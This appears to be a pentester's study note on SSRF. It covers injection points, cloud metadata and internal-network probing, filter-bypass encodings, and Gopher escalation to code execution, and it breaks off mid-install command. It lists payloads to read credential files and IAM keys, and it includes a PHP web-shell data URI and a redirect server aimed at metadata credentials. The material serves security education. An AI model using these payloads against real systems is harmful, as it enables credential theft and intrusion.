---
created: 2026-05-03
tags:
  - web_hacking
  - SSRF
---
## SSRF

>**Server-Side Request Forgery (SSRF)** is a vulnerability that allows an attacker to manipulate a server into initiating **unintended outbound network requests** to an arbitrary destination — internal or external.

- SSRF occurs when a server-side component accepts a **URL, hostname, or IP address** from a user-controlled input and uses it to retrieve resources without proper validation. 
- This allows an attacker to issue requests to **arbitrary destinations of their choice** on server's behalf. The server acts as an *unwitting proxy*.
- SSRF is fundamentally a **trust-boundary violation**: an attacker **abuses the server's network identity** to reach internal services that would otherwise be inaccessible due to firewall rules.
- The issue is protocol-agnostic. Any scheme supported by the client stack (e.g., `http`, `https`, `gopher`, `file`, `dict`, `ftp`) may be abused if not explicitly constrained. From the target service’s perspective, the request originates from a **trusted internal principal**.

### How SSRF works

When a web application fetches a remote resource based on user-supplied input, the flow looks like this:

![[SSRF.svg|729]]


1. **User input influences the outbound request**
	- User-controlled data is incorporated into a server-side request. 
	- This is commonly seen in:
		- URL preview/fetchers
		- Webhooks and callbacks
		- Import/export features
		- Server-side API integrations

2. **Server constructs and sends the request**
	- The backend resolves the supplied hostname, establishes a connection, and issues a request using its own network context. 

3. **Trust boundary is crossed**
	- Because the request originates from a trusted environment, the server can access internal services (e.g., `localhost`, `127.0.0.1`, private subnets), management interfaces and admin panes, cloud metadata endpoints (e.g., `192.254.169.254`), etc.
	- These resources are often inaccessible from the public internet but implicitly trust internal callers.
### Potential impact 

- **Internal network reconnaissance**
    - Host discovery, port scanning via timing/behavioral side channels, service fingerprinting.
- **Unauthorized access to internal services**
	- Admin panels, internal APIs, monitoring dashboards that are often left without authentication because of over-reliance on network perimeter.
- **Cloud metadata exfiltration**
    - Access to instance metadata services (e.g., AWS/GCP/Azure); retrieval of IAM credentials, identity documents, configuration, or keys from cloud IMDS.
- **Local file access**
    - Use of `file://` or equivalent handlers to read sensitive files (e.g., `/etc/passwd`, application secrets).
- **Lateral movement**
    - Invocation of internal control planes (queues, caches, service meshes) to expand access.
- **RCE (Remote Code Execution)**
    - Interaction with services that accept command payloads over text/binary protocols (e.g., Redis, Memcached, FastCGI) via scheme abuse (e.g., `gopher://`) or request shaping.
- **Data exfiltration**
    - Direct (in-band) or indirect (blind SSRF with out-of-band channels such as DNS/HTTP callbacks).

> [!important] SSRF against cloud metadata services is consistently critical. AWS IMDSv1 (no token required) returns IAM credentials in a single unauthenticated request. In real-world environments, those credentials often carry far too much privilege.

- SSRF impact mainly depends on **where the request can be sent**:

The potential impact of SSRF heavily depends on where the requests can be sent:
- Services running on `localhost` (the vulnerable server itself).
- Internal resources (e.g., services on the local network, cloud metadata endpoints, etc.).
- Arbitrary external endpoints.

>[!warning] Requests to external services are often blocked by firewalls. 

## SSRF testing methodology

### 1. Enumerate injection points

SSRF vulnerabilities arise wherever the server-side code makes an outbound network request based on user-controlled input. The key is to identify functionality that **causes the server to fetch enteral resources**.

- Explicit URL parameters are the most obvious entry point:

```
GET /fetch?url=https://example.com
GET /preview?src=https://example.com/image.png
GET /proxy?dest=https://example.com
```

- Common parameter names to look for:

```
dest
redirect
uri
path
continue
url
window
next
data
reference
site
html
val
validate
domain
callback
return
page
feed
host
port
to
out
view
dir
```

- Features worth investigating:
	- Image loaders — avatar upload via URL, link previews, thumbnail generators.
	- Webhook endpoints — any feature that accepts a callback URL.
	- Document/PDF generators — headless browsers or HTML-to-PDF tools that render external content.
	- Import/export features — "import from URL", RSS feed readers, social profile linking.

> [!important] Focus on any feature that causes the server to **retrieve / process external data**.

- Other injection points:
	- XML External Entity (XXE) — XML parsers can sometimes be abused to trigger server-side requests.
	- HTTP headers used in server-side analytics and tracking — `Referer`, `Host`, `X-Forwarded-For`, etc.


> [!bug]+ SSRF in `Referer` HTTP headers
> - Server-side analytics/tracking software used by some application often logs the [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer) header from user requests to track where visitors navigate from.
> - In certain cases, the application may **fetch the URL** in the header to extract metadata. If no sufficient validation is enforced, this can lead to **blind SSRF** (see [[#Blind SSRF]]).

### 2. Confirm the server makes outbound requests

Before targeting internal services, verify that the input actually triggers a server-side request.

- Use OOB (Out-of-Band) tools like:

	- **[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)** (Burp Suite Professional)
		- Built into Burp Suite (Professional); generates a unique domain (`<subdomain.burpcollaborator.net>`) and monitors for DNS, HTTP, and other interactions.
	- **[`interactsh`](https://app.interactsh.com/#/)** 
		- Free open-source OOB server; designed for testing bugs that cause external interacts, such as SSRF, blind SQLi, blind command injection, etc.
	- **[`webhook.site`](https://webhook.site)**
		- A tool for building webhooks; generates a free, unique, random URL and e-mail address — everything that's sent to these addresses is displayed in the logs. 
	- **[`DNSlog.cn`](http://www.dnslog.cn/) and [`DNSLOG`](https://dnslog.org/)**
		- Public DNS logging services.

> [!example]+
> ```http
> POST /api/fetch HTTP/1.1
> Host: target.com
> Content-Type: application/json
> 
> {"url": "https://<collaborator_id>.oastify.com"}
> ```

- A DNS or HTTP interaction confirms that the server is making outbound requests.
- This doesn’t guarantee this behavior is exploitable yet, but it proves SSRF is possible.
### 3. Probe internal targets

Once confirmed, start testing high-value targets.

- Localhost:
	- `localhost`.
	- `127.0.0.0/8` (`127.0.0.1` to `127.255.255.224`).
	- `::1` (`0000:0000:0000:0000:0000:0000:0000:0001`; IPv6 loopback).
	- `::` (IPv6 unspecified address, may sometimes work).
	- `lo`, `lo0` (loopback interface on Unix/Linux).

```bash
http://localhost
http://127.0.0.1
http://127.0.0.2
http://[::1]
http://[0000::1]
http://[::]
```

- Private IPv4 address ranges (as per [`RFC 1918`](https://datatracker.ietf.org/doc/html/rfc1918)):
	- `10.0.0.0/8` (`10.0.0.0` to `10.255.255.255`).
	- `172.16.0.0/12` (`172.16.0.0` to `172.31.255.255`).
	- `192.168.0.0/16` (`192.168.0.0` to `192.168.255.255`).

```
http://192.168.0.1/
```

> [!tip]+ Use the [`seq`](https://man.archlinux.org/man/seq.1) command (built-in) to generate numeric sequences and probe for IP address ranges
> - For example, the following command prints IP addresses from `10.0.0.0` to `10.0.0.255`:
> 
> ```bash
> seq -f "10.0.0.%g" 0 255
> ```
> 
> ```bash
> 10.0.0.0
> 10.0.0.1
> 10.0.0.2
> 10.0.0.3
> ...
> ```

- IPv6 [unique local addresses](https://en.wikipedia.org/wiki/Unique_local_address) (as per [`RFC 4193`](https://datatracker.ietf.org/doc/html/rfc4193)):
	- `fc00::/7` (actually, `fd00:/8`, since the 8th bit must be set to `1`; `fc00:/8` is currently not defined).


- Cloud metadata endpoints:
	- AWS: `http://169.254.169.254/latest/meta-data/` (AWS's [IMDSv1](https://aws.amazon.com/blogs/security/get-the-full-benefits-of-imdsv2-and-disable-imdsv1-across-your-aws-infrastructure/) **does not require authentication**).
	- GCP: `http://metadata.google.internal/`
	- Azure (an [HTTP header](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux) is required): `http://169.254.169.254/metadata/instance?api-version=2021-01-01`

```
http://169.254.169.254/latest/meta-data/
```

>[!tip]- List of cloud metadata endpoints 
> 
> - See [`Cloud Metadata Dictionary useful for SSRF Testing — ByffaloWill, GitHub Gist`](https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb).
> - You can use this list to fuzz possible target endpoints.
> 
> ```powershell
> ## IPv6 Tests
> http://[::ffff:169.254.169.254]
> http://[0:0:0:0:0:ffff:169.254.169.254]
> 
> ## AWS 
> # Amazon Web Services (No Header Required)
> # from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
> http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
> http://169.254.169.254/latest/user-data
> http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
> http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
> http://169.254.169.254/latest/meta-data/ami-id
> http://169.254.169.254/latest/meta-data/reservation-id
> http://169.254.169.254/latest/meta-data/hostname
> http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
> http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
> 
> # ECS Task : https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html
> http://169.254.170.2/v2/credentials/
> 
> ## Google Cloud (Header Sometimes Required)
> #  https://cloud.google.com/compute/docs/metadata
> #  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True" on API v1
> #  - Most endpoints can be accessed via the v1beta API without a header
> http://169.254.169.254/computeMetadata/v1/
> http://metadata.google.internal/computeMetadata/v1/
> http://metadata/computeMetadata/v1/
> http://metadata.google.internal/computeMetadata/v1/instance/hostname
> http://metadata.google.internal/computeMetadata/v1/instance/id
> http://metadata.google.internal/computeMetadata/v1/project/project-id
> # kube-env; thanks to JackMc for the heads up on this (https://hackerone.com/reports/341876)
> http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
> # Google allows recursive pulls 
> http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
> # returns root password for Google
> http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
> 
> ## Digital Ocean (No Header Required)
> # https://developers.digitalocean.com/documentation/metadata/
> http://169.254.169.254/metadata/v1.json
> http://169.254.169.254/metadata/v1/ 
> http://169.254.169.254/metadata/v1/id
> http://169.254.169.254/metadata/v1/user-data
> http://169.254.169.254/metadata/v1/hostname
> http://169.254.169.254/metadata/v1/region
> http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
> 
> ## Packetcloud
> https://metadata.packet.net/userdata
> 
> # Azure (Header Required)
> # Header: "Metadata: true"
> # https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
> # (Old: ) https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
> http://169.254.169.254/metadata/instance?api-version=2017-04-02
> http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
> 
> # Oracle Cloud (No Header Required)
> # https://docs.us-phoenix-1.oraclecloud.com/Content/Compute/Tasks/gettingmetadata.htm
> http://169.254.169.254/opc/v1/instance/
> 
> # Updated from jhaddix fork ===
> ## Alibaba
> # https://www.alibabacloud.com/help/faq-detail/49122.htm
> http://100.100.100.200/latest/meta-data/
> http://100.100.100.200/latest/meta-data/instance-id
> http://100.100.100.200/latest/meta-data/image-id
> # ===
> 
> ## OpenStack/RackSpace 
> # https://docs.openstack.org/nova/latest/user/metadata-service.html
> http://169.254.169.254/openstack	 
> 
> ## Oracle Cloud
> # https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html
> http://192.0.0.192/latest/
> http://192.0.0.192/latest/user-data/
> http://192.0.0.192/latest/meta-data/
> http://192.0.0.192/latest/attributes/
> 
> ## Kubernetes
> # Debug Services (https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/)
> https://kubernetes.default.svc.cluster.local
> https://kubernetes.default
> # https://twitter.com/Random_Robbie/stat
> ```

>[!note] See [`Cloud SSRF — HackTricks`](https://hacktricks.alquymia.com.br/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html).

- Common local ports:

```
http://127.0.0.1:22     # SSH
http://127.0.0.1:3306   # MySQL
http://127.0.0.1:5432   # PostgreSQL
http://127.0.0.1:6379   # Redis
http://127.0.0.1:8080   # common admin/internal app port
http://127.0.0.1:8443
http://127.0.0.1:9200   # Elasticsearch
http://127.0.0.1:11211  # Memcached
```

- Try changing:
	- Scheme (`http`, `https`, `file`, `gopher`, etc.)
	- Domain
	- Port
	- URL path
	- URL parameters

>[!tip]+ If the request is blocked, attempt common bypasses, such as setting `Referer` to `localhost`. 

### 4. Analyze response

- Even when responses aren't directly visible, behavioral differences can reveal whether a request succeeded:
	- **Different HTTP status codes**
		- Indicate the server reached the target.
	- **Response time differences**
		- Useful for distinguishing open vs. closed ports (port sweeping).
	- **Error messages**
		- May leak internal network details.
	- **Response body changes**
		- Server is relaying content — you have a non-blind SSRF.
	- **DNS or HTTP callback**
		- DNS/HTTP callbacks confirm blind SSRF.


- Any observable difference may indicate that the server is attempting outbound requests.
Any of this might indicate that the server is trying to fetch resources. 

> [!important] If no visible response is returned, continue with **blind SSRF techniques**.

- Test redirects.
- Try hostname/IP bypasses.
- Prioritize targets:
    - Localhost
    - Internal networks
    - Cloud metadata services

## SSRF against the local server


- Requests to the loopback interface often bypass network-level access controls entirely.

One of the most common SSRF exploitation paths is targeting services running on the vulnerable host itself (`localhost`). These services are typically not exposed externally but may trust local connections.

| Loopback address                                    | Description                                                                |
| --------------------------------------------------- | -------------------------------------------------------------------------- |
| `127.0.0.0/8`<br>(`127.0.0.1` to `127.255.255.224`) | IPv4 loopback range;<br> `127.0.0.1` is the most common.                   |
| `::1`                                               | IPv6 loopback address.                                                     |
| `localhost`                                         | Resolves to `127.0.0.1` or `::1`.                                          |
| `0.0.0.0` / `0`                                     | May resolve to the local host in some contexts (implementation-dependent). |

```PowerShell
http://127.0.0.1:8080/admin
http://localhost:8080/admin
http://[::1]:8080/admin
```

> [!note] In URLs, IPv6 addresses must be enclosed in square brackets: `http://[::1]/` (not `http://::1/`) to distinguish between the address part and port number.

> [!bug]+ Port sweeping using SSRF
> 
> - SSRF can be used to enumerate open ports on the local machine. 
> - You initiate HTTP requests to different ports on the local server and observe differences in responses (status codes, timing, errors).
> 
> ```powershell
> http://127.0.0.1:21   # FTP
> http://127.0.0.1:22   # SSH
> http://127.0.0.1:23   # Telnet
> http://127.0.0.1:8080 # common web/admin
> ```
> 
> This technique is sometimes called **Cross-Site Port Attack (XSPA)**.
> 
> - Open ports may return valid responses or distinct errors.
> - Closed ports often result in connection timeouts or connection-refused behavior.
> - Even blind SSRF can support port discovery via timing side channels.

## SSRF against hosts on an internal network

Beyond localhost, SSRF can be used to pivot into the internal network accessible to the vulnerable server.

Addresses to target:

- Private IPv4 addresses (as per [`RFC 1918`](https://datatracker.ietf.org/doc/html/rfc1918)):
	- `10.0.0.0/8` (`10.0.0.0` to `10.255.255.255`).
	- `172.16.0.0/12` (`172.16.0.0` to `172.31.255.255`).
	- `192.168.0.0/16` (`192.168.0.0` to `192.168.255.255`).
- IPv6 [unique local addresses](https://en.wikipedia.org/wiki/Unique_local_address) (as per [`RFC 4193`](https://datatracker.ietf.org/doc/html/rfc4193)):
	- `fd00:/8` (`fc00::/7` with 8th bit set to `1`).

>[!bug]+ Network scanning through SSRF
> 
> Similar to port sweeping, SSRF attacks can be used to probe for live hosts on the internal network:
> 
> ```PowerShell
> http://192.168.0.1:80
> http://192.168.0.2:80
> http://192.168.0.2:8080
> # ...
> ```
> Indicators of live systems include:
> 
> - HTTP responses (even error pages)
> - Consistent timing differences
> - Variations in status codes

## Bypassing validation

Applications commonly attempt to block SSRF by validating the destination URL. Almost all such implementations are vulnerable to bypasses of some sort because URL parsing is inconsistent across libraries and runtimes.
### Alternative URL schemes

`http://` and `https://` are not the only schemes a networking library will handle. Many backends use `libcurl`, Python's `urllib`, Java's `URL`, or similar libraries that support a wide range of legacy protocols.

- **`file://`** — Local filesystem access.
	- The `file://` scheme is used to read files on the local server filesystem; it bypasses network-based filtering because **no outbound requests are made**.

```powershell
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
```


- **`gopher://`** — Raw TCP payload injection
	- [Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)) is a pre-HTTP document retrieval protocol from 1991; rarely supported today.
	- Its defining feature is that Gopher URLs can embed **raw TCP payloads**; in other words, you can speak arbitrary application-layer protocol through Gopher SSRF — send Redis commands, Memcached commands, SMTP envelopes, raw HTTP requests to internal service, and so on.
	- This often leads to RCE.
	- See [[#SSRF to RCE with Gopher]] section.
	
```powershell
gopher://127.0.0.1:11211/_stats
```

- **`dict://`** — Command injection into `dict` servers
	- `dictL//` scheme is used to query [DICT](https://en.wikipedia.org/wiki/DICT) (dictionary) servers; less powerful than Gopher but still can be abused to achieve RCE.

```powershell
dict://localhost:11211/stat
dict://localhost:6379/info

```

-  **`data://`** — Inline payloads
	- The [`data://`](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/data) scheme can be used to embed small files inline; similar to Gopher, can be abused to achieve RCE.
	
```powershell
# data:[<media-type>][;base64],<data>
data:text/plain;base64,SGVsbG8sIFdvcmxkIQ== # Hello, World!
```

```
data:text/plain;base64,SGVsbG8gV29ybGQ=
data:application/x-php,<?php system($_GET['cmd']); ?>
```

- **`phar://` and other PHP-specific wrappers**

```powershell
phar:///var/www/app.phar
expect://id
```

> [!important] Supported schemes are **runtime-dependent**.  
> - PHP exposes the broadest attack surface (e.g., `expect://` may lead to RCE if enabled). 
> - Java supports `netdoc://` for file access. 
> - Some .NET environments support `gopher://`.

> [!tip] Instead of testing schemes manually, fuzz them using [`SecLists/Fuzzing/curl-protocols.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/curl-protocols.txt).

>[!note] See [`List of URI schemes — Wikipedia`](https://en.wikipedia.org/wiki/List_of_URI_schemes) for a more complete list of various URI schemes in existence.

>[!note]- URL schemes supported by different programming languages and frameworks
> PHP:
> 
> ```
> gopher://
> fd://
> expect://
> ogg://
> tftp://
> dict://
> ftp://
> ssh2://
> file://
> http://
> https://
> imap://
> pop3://
> mailto://
> smtp://
> telnet://
> ```
> 
> ASP.NET:
> 
> ```
> gopher://
> ftp://
> file://
> http://
> https://
> ```
> 
> Java:
> 
> ```
> ftp://
> file://
> http://
> https://
> gopher://
> netdoc:///etc/passwd
> netdoc:///etc/hosts
> jar:proto-schema://blah!/
> jar:http://localhost!/
> jar:http://127.0.0.1!/
> jar:http://0.0.0.0!/
> jar:ftp://local-domain.com!/
> ```
> 
> OpenJDK 8+ does not follow redirects if the protocols do not match.

### Alternative IP address representation


- **Decimal notation** — Represent the entire IPv4 address as a 32-bit integer

```powershell
http://2130706433/   # 127.0.0.1 = (127 * 16777216) + 1
http://167772161/    # 10.0.0.1
http://3232235521/   # 192.168.0.1
```

>[!example]- IPv4 to decimal and back in Python
> 
> - IPv4 to decimal:
> 
> ```Python
> import ipaddress
> ip_str = input("IPv4 address: ")
> ip_int = int(ipaddress.IPv4Address(ip_str))
> print(f"Decimal representation: {ip_int}")
> ```
> 
> ```bash
> IPv4 address: 192.168.0.11
> Decimal representation: 3232235531
> ```
> 
> - Decimal to IPv4:
> 
> ```Python
> import ipaddress
> ip_int = int(input("IPv4 in decimal: "))
> ip_str_restored = str(ipaddress.IPv4Address(ip_int))
> print(f"IPv4 address: {ip_str_restored}")  
> ```
> 
> ```bash
> IPv4 in decimal: 3232235531
> IPv4 address: 192.168.0.11
> ```

- **Octal notation** — each octet in base-8:

```powershell
http://0177.0.0.1/      # 127.0.0.1
http://017700000001/    # 127.0.0.1 (compact)
http://0177.0000.0000.0001/
```

> [!example]- IPv4 to octal and back in Python
> 
> - IPv4 to octal:
> 
> ```Python
> import ipaddress
> ip_str = input("IPv4 address: ")
> octal_ip = '.'.join(format(int(x), '04o') for x in ip_str.split('.'))
> print(f"Octal representation: {octal_ip}")
> ```
> 
> ```bash
> IPv4 address: 192.168.0.11
> Octal representation: 0300.0250.0000.0013
> ```
> 
> - Octal to IPv4:
> 
> ```Python
> import ipaddress
> octal_ip = input("IPv4 in octal: ")
> ip_str_restored = '.'.join(str(int(o, 8)) for o in octal_ip.split('.'))
> print(f"IPv4 address: {ip_str_restored}")
> ```
> 
> ```bash
> IPv4 in octal: 0300.0250.0000.0013
> IPv4 address: 192.168.0.11
> ```

- **Hexadecimal notation**:

```powershell
http://0x7f000001/    # 127.0.0.1
http://0x0a000001/    # 10.0.0.1
http://0xC0A80001/    # 192.168.0.1
```

- **Dropping zeroes** — abbreviated forms:

```powershell
http://127.1/         # 127.0.0.1 (zero-filling)
http://127.0.1/       # 127.0.0.1
http://0/             # 0.0.0.0 → 127.0.0.1 on Linux
http:///0/
http://@0/
```

>[!info] If fewer than 4 octets are given, the missing ones are treated as zero and inserted before the last given octet. So `127.1` → `127.0.0.1`, and `10.3.1` → `10.3.0.1`.

- **IPv4-mapped IPv6** (IPv4/IPv6 address embedding):

```powershell
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
```

>[!note] See  [`IPv6/IPv4 Address Embedding — The TCP/IP Guide`](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm).

**Other edge cases**:

- Dot validation bypass:

```PowerShell
http://127。0。0。1
http://127%E3%80%820%E3%80%820%E3%80%821
```

- Invalid addresses:

```PowerShell
http://127.000000000000000000.1
http://@0
```

- Unspecified addresses:

```PowerShell
http://0.0.0.0 # IPv4
http://0
http://[::]    # IPv6
```

>[!example]+ Example: Enumerating unfiltered localhost address representations 
>Here is an example of a `ffuf` command you can use to brute-force what is not filtered (used to solve [this](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter) lab):
> 
> ```bash
> ffuf -c -u https://0a0100bb038374228289a6710019000c.web-security-academy.net/product/stock -w localhost.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -X POST -d 'stockApi=http%3A%2F%2FFUZZ%2Fadmin' -mc all
> ```
> 
### Redirect bypass

- One of the ways to bypass URL validation is to exploit an **open redirect vulnerability** in the target application: the filter sees an allowed hostname, but the actual destination is an internal address:

```bash
https://example.com/index?url=http://169.254.169.254/latest/meta-data/
```

- You can also host your own redirection server or use [`Horlad/r3dir`](https://github.com/Horlad/r3dir):

```bash
https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
```

```bash
302.r3dir.me -> 302 Found
307.r3dir.me -> 307 Temporary Redirect
200.r3dir.me -> 200 OK
```

>[!note] Unlike `302 Found`, a `307 Temporary Redirect` preserves the original HTTP method (e.g., `POST`, `PUT`, `DELETE`, etc.) and request body.

> [!example]- A minimal Python redirect server
> 
> ```python
> from http.server import BaseHTTPRequestHandler, HTTPServer
> 
> class RedirectHandler(BaseHTTPRequestHandler):
>     def do_GET(self):
>         self.send_response(302)
>         self.send_header("Location", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
>         self.end_headers()
> 
> HTTPServer(("0.0.0.0", 8080), RedirectHandler).serve_forever()
> ```
### Domain bypass

- Use domain names that redirect to `localhost` (or you can register your own):

```PowerShell
# all the websites here redirect to localhost
http://localtest.me                  # ::1
http://localh.st                     # 127.0.0.1
http://hackingwithpentesterlab.link  # 127.0.0.1
http://spoofed.burpcollaborator.net  # 127.0.0.1
http://spoofed.redacted.oastify.com  # 127.0.0.1
company.127.0.0.1.nip.io             # 127.0.0.1
```

- The [`sslip.io`](https://sslip.io/) service (formerly `nip.io`; domains `sslip.io` and `nip.io` can be used interchangeably) is designed to redirect to **any IP address** you embed as a subdomain:

```powershell
http://127.0.0.1.nip.io/          # resolves to 127.0.0.1
http://192.168.1.1.nip.io/        # resolves to 192.168.1.1
http://169.254.169.254.nip.io/    # resolves to 169.254.169.254
```

>[!note]+ `/etc/hosts` file on Linux may sometimes contain the line `::1 localhost ip6-localhost ip6-loopback` on IPv6-capable systems
> 
> ```PowerShell
> http://ip6-localhost # ::1
> http://ip6-loopback  # ::1
> ```

>[!tip] [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) is a more sophisticated variant where a domain initially resolves to an allowed IP, then rapidly re-resolves to an internal IP. The application validates the first resolution but makes a request using the second.

### Abusing URL parsing discrepancies

Different components of a web application (WAF, load balancer, application server, HTTP library) may parse URLs differently. These parsing gaps create bypass opportunities.

- **Credential embedding**:

```powershell
https://expected-host.com:junk-password@attacker-host.com
```

This bypasses filters that check hostname only at the start of the URL but don't analyze the whole thing.

- **Subdomain tricks**:

```powershell
https://expected-host.com.attacker-host.com
```

You can register subdomains `com` and `expected-host` for your own domain name to bypass filters that only check the beginning of the URL.

- **Fragment confusion**:

```powershell 
https://attacker-host.com#expecte-host.com
```

Same principle — bypasses validation at the end of the URL.


>[!note] For other bypasses, see:
> - [`A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!`](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
> - [`URL validation bypass cheat sheet — PortSwigger`](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

### Encoding

- URL encoding can bypass exact string-matching filters:
	- **URL (percent) encoding** (see [CyberShef — URL encoding](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=aHR0cDovL2F0dGFja2VyLmV4YW1wbGUuY29t)).
	- **Double URL encoding** (see [CyberShef — Double URL encoding](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)URL_Encode(true)&input=aHR0cDovL2F0dGFja2VyLmV4YW1wbGUuY29t)).
	- **Unicode escape sequences and UTF-8 encoding** (see [CyberShef — Unicode escape](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',true,4,true)&input=aHR0cDovL2F0dGFja2VyLmV4YW1wbGUuY29t)).

- **[Enclosed alphanumeric](https://en.wikipedia.org/wiki/Enclosed_Alphanumerics)** for copy-paste:

```
①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳
⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇
⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛
⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵
ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪
⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴
⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾
⓿
```

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

- You can encode only special characters like `!`, `$`, `'`, etc., or all characters. 

>[!tip] Fuzz encoding variants with `ffuf` when you have a confirmed SSRF but filter bypass is needed.

## Blind SSRF

> **Blind SSRF** is a variant of Server-Side Request Forgery in which the server initiates the attacker-induced request but does not return the response — or any derivative of it — in the HTTP response observable by the attacker.

- To detect Blind SSRF, out-of-band detection is needed. 
- The primary detection method is an **OOB (Out-of-Band) callback**: force the server to make a request to an infrastructure you monitor.

- Already mentioned in [[#2. Confirm the server makes outbound requests]]:

	- **[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)** (Burp Suite Professional)
		- Built into Burp Suite (Professional); generates a unique domain (`<subdomain.burpcollaborator.net>`) and monitors for DNS, HTTP, and other interactions.
	- **[`interactsh`](https://app.interactsh.com/#/)** 
		- Free open-source OOB server; designed for testing bugs that cause external interacts, such as SSRF, blind SQLi, blind command injection, etc.
	- **[`webhook.site`](https://webhook.site)**
		- A tool for building webhooks; generates a free, unique, random URL and e-mail address — everything that's sent to these addresses is displayed in the logs. 
	- **[`DNSlog.cn`](http://www.dnslog.cn/) and [`DNSLOG`](https://dnslog.org/)**
		- Public DNS logging services.

>[!important] Blind SSRF is **not low impact**. Many critical SSRF chains start blind.

>[!tip] See [`assetnote/blind-ssrf-chains`](https://github.com/assetnote/blind-ssrf-chains) to learn how to chain SSRF vulnerabilities to find high-impact bugs.

>[!tip] An effective way to abuse blind SSRF is to combine it with a shellshock vulnerability ([CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271)). See [`PortSwigger Lab: Blind SSRF with shellshock`](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation) for more details.
## SSRF to RCE with Gopher

This is the most powerful SSRF escalation path when network services are reachable from the vulnerable server. Understanding it requires understanding how the Gopher protocol works internally.

- Before the World Wide Web, the [Gopher](https://datatracker.ietf.org/doc/html/rfc1436) protocol, created in 1991 at the University of Minnesota, was one of the primary ways to navigate and retrieve information in the Internet.
- Now Gopher became obsolete, but many networking libraries, including `libcurl` (which powers `curl` and is used by countless programming languages), **still support Gopher** for backward compatibility.

>[!note] The default Gopher port is TCP `70`.

>[!note] Traditionally, Gopher servers used to listen on TCP port `70`.

>[!interesting]+ Just if you're curious, take a look at the list of [Active Gopher servers](https://evert.meulie.net/2011/12/01/active-gopher-servers/) (you can even interact with them). Remnants of Internet infancy.

- What makes Gopher useful for SSRF is that **a Gopher URL can embed arbitrary raw bytes, which are sent directly to the target service after the TCP connection is established**.
- The server connects to `<host>:<port>`, the payload is written **verbatim into the socket**.
- This allows SSRF to **speak with non-HTTP services**.

---
- **Gopher URL structure**:

```powershell
gopher://<host>:<port>/_<payload>
```

- All special characters in a Gopher URL must be URL-encoded.

### Generating payloads

- To generate Gopher links automatically, you can use the [`tarunkant/Gopherus`](https://github.com/tarunkant/Gopherus) tool. It supports the following protocols:
	
	- MySQL (TCP `3306`)
	- PostgreSQL (TCP `5432`)
	- FastCGI (TCP `9000`)
	- Memchached (TCP `11211`)
	- Redis (TCP `6379`)
	- Zabbix (TCP `10050`)
	- SMTP (TCP `25`)
	 
>[!note]+ Installation
>```bash
>git clone https://github.com/tarunkant/Gopherus && \
>cd Gopherus && \
